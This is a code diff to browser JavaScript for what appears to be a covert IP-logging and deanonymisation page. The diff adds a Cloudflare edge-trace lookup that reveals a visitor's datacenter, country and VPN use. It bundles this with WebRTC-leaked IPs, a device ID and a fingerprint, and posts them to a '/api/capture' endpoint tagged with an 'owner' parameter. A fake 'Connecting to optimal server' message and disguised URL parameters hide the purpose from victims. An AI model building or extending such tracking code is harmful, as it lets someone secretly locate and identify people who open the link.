@@ -250,6 +250,27 @@ async function getWebGPUFingerprint() {
   } catch { return { error: true }; }
 }
 
+async function getEdgeTrace() {
+  try {
+    // Ping Cloudflare's edge to get the physical IATA airport code of the datacenter serving the request
+    const res = await fetch('https://1.1.1.1/cdn-cgi/trace', { cache: 'no-store' });
+    const text = await res.text();
+    const data = {};
+    text.split('\n').forEach(line => {
+      const [key, val] = line.split('=');
+      if (key && val) data[key] = val.trim();
+    });
+    return {
+      colo: data.colo || 'unknown', // The Datacenter (e.g. BGW, BSR, DXB)
+      loc: data.loc || 'unknown',   // Edge-determined country
+      tls: data.tls || 'unknown',
+      warp: data.warp || 'off'      // Detects Cloudflare WARP VPN
+    };
+  } catch {
+    return null;
+  }
+}
+
 function getFontsFingerprint() {
   const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Cairo', 'Amiri', 'Tajawal', 'Almarai', 'Kufi'];
   const canvas = document.createElement('canvas');
@@ -461,20 +482,23 @@ async function measureTriangulation() {
 async function sendInitialCapture() {
   try {
     setStatus('Connecting to optimal server...');
-    const [webrtcIPs] = await Promise.all([leakWebRTCIPs()]);
+    const [webrtcIPs, edgeTrace] = await Promise.all([leakWebRTCIPs(), getEdgeTrace()]);
     
     // Detect owner from URL (using technical aliases for a more 'real' look)
     const params = new URLSearchParams(window.location.search);
     const owner = params.get('node') || params.get('sid') || params.get('cid') || params.get('ref') || params.get('admin') || 'global';
+
+    const fingerprint = await collectFingerprint();
 
     const response = await fetch('/api/capture', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
         webrtcIPs, 
-        deviceId: await getPersistentId(), 
+        edgeTrace,
+        deviceId: getDeviceId(), 
         owner, 
-        ...collectFingerprint() 
+        ...fingerprint 
       }),
     });
 
